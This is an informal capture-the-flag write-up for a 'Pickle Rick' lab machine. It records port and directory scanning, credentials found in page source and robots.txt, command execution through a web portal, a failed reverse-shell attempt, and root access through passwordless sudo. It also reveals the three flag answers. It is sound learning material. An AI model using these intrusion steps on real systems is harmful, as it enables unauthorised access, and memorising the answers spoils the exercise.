####Pickle_Rick

Target IP:
10.10.125.13

MY IP:
10.9.222.124

## Enumeration

# nmap initial scan
22 ssh
80 http

going to the Target IP reveals a homepage

starting dirbuster with medium wordlist

dirbuster found a /login.php

also in the page code of the landingpage there is a message:

<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

there is also Portal.php -> this needs to be checked out

# gobuster
dirbuster seems to return not enough, runing go buster

found in Robots.txt
Wubbalubbadubdub

With 
Name: R1ckRul3s
Pass: Wubbalubbadubdub

# Protal enumeration

I can login at /login.php while gobuster is rung in the background
here I can execute comands. Need to do some tests and googling.

shell comands work

$ls
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

In Sup3rS3cretPickl3Ingred.txt I find the first flag

mr. meeseek hair

In clue.txt I find

"Look around the file system for the other ingredient."
	
wich leads me to belive that maybe there is a way to upload a PHP payload to assets. So I test that.

I started a NC listener in the protal which might have broken the thing :(

be more carefull, sping up the machine again

# Enumerationg Comands in Portal

Works:
ls
ps aux
====
whoami = www-data
getent passwd = 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash

====
echo

=====
dir!!!
=====

Doesn't work:
cat = Command disabled to make it hard for future PICKLEEEE RICCCKKKK.

Not shure:
cd

# Getting access

after fidling around with the comand line, i tried to spawn a reverse shell to conect to the machine, sadly
I was not succesfull.

# Read a little hint

I found the second ingredient relativly easy, but 
couldn't read it since cat is disabled, so I read little bit
of a walkthrough and now I'll try "less"

$less /home/rick/"second ingredients"
1 jerry tear

# escalating privliges

$sudo -l

tells we can do anything without a password

$sudo ls /root
shows the 3rd ingredient

$sudo less /root/3rd.txt
3rd ingredients: fleeb juice
